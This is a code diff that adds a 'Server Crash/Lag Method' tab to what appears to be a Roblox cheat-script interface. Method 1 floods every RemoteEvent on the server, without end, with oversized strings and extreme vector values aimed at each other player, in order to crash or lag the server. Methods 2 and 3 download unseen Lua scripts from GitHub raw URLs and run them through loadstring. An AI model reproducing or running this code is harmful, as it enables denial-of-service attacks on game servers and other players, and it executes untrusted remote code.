@@ -3181,3 +3181,65 @@ end
 clickBalloonAndApple(30000)
     end
 })
+
+local Tab19 = Window:MakeTab({
+    Name = "Server Crash/Lag Method",
+    Icon = "rbxassetid://0",
+    PremiumOnly = false
+})
+
+Tab19:AddButton({
+    Name = "Server Crash Method 1",
+    Callback = function()
+        local Players = game:GetService("Players")
+local RS = game:GetService("ReplicatedStorage")
+local me = Players.LocalPlayer
+
+
+local remoteList = {}
+for _, r in pairs(RS:GetDescendants()) do
+    if r:IsA("RemoteEvent") then
+        table.insert(remoteList, r)
+    end
+end
+
+
+local function targetCrash(targetPlayer)
+    spawn(function()
+        while wait(0.5) do
+            for _, r in pairs(remoteList) do
+                pcall(function()
+                    r:FireServer(
+                        string.rep("a", 10000),
+                        {targetPlayer.Character or workspace:FindFirstChild(targetPlayer.Name)},
+                        Vector3.new(1e9, 1e9, 1e9)
+                    )
+                end)
+            end
+        end
+    end)
+end
+
+
+for _, plr in pairs(Players:GetPlayers()) do
+    if plr ~= me then
+        targetCrash(plr)
+    end
+			end
+			
+    end
+})
+
+Tab19:AddButton({
+    Name = "Server Crash Method 2",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/v0c0n1337/scripts/refs/heads/main/robloxfeservercrashxdxdezbypsssed.txt"))()
+    end
+})
+
+Tab19:AddButton({
+    Name = "Server Crash Method 3",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/v0c0n1337/scripts/refs/heads/main/servercrashv3.lua.txt"))()
+    end
+})
